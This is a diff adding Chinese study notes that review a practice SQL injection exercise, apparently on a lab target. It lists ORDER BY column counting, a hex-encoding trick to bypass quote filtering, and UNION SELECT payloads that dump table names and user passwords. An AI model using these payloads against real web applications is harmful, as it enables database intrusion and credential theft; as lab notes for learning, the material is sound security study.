@@ -1,0 +1,26 @@
+# SQL注入实战复盘（中高级）
+
+## 1. 本次注入核心收获
+- 已成功完成中高级SQL注入，拿到目标数据库用户密码，验证了完整注入流程的可行性。
+- 明确了本次注入的类型：`【字符型联合查询注入】`
+- 掌握了从判断注入点到脱库拿数据的完整步骤，每一步的执行目的清晰。
+
+## 2. 本次遇到的过滤 & 对应绕过
+| 过滤类型 | 过滤内容 | 我用的绕过方法 | 备注 |
+| 字符型 |  | 单引号'被过滤/转义，无法直接用'闭合| 使用十六进制编码代替字符串，users-0x7573657273，全程不出现引号 |
+
+## 3. 关键Payload记录
+- 注入点判断：`【用Burpsuite抓包练习，没有提交选项，直接判断的字段数】`
+- 字段数判断：`【id=1 order by 2 正常回显】`
+- 字段数判断：`【id=1 order by 3 报错，判断字段数为2 】`
+- 脱库语句：`【拿id=1 union select 1,database( ）&Submit=Submit拿到库名/
+id=2 union select 1,table_name from information_schema.tables where table_schema=(select database())#&Submit=Submit表名/
+id=1 union select 1,group_concat (column_name) from information_schema.columns where table_name=0x7573657273#&Submit=Submit字段名/
+id=1 union select user,password from users#&Submit=Submit密码的核心语句】`
+
+## 4. 踩坑与总结
+- 坑1：`【一开始没发现引号被过滤，payload一直报错】`
+- 解决：`【用十六进制替换'后成功执行】`
+
+
+---
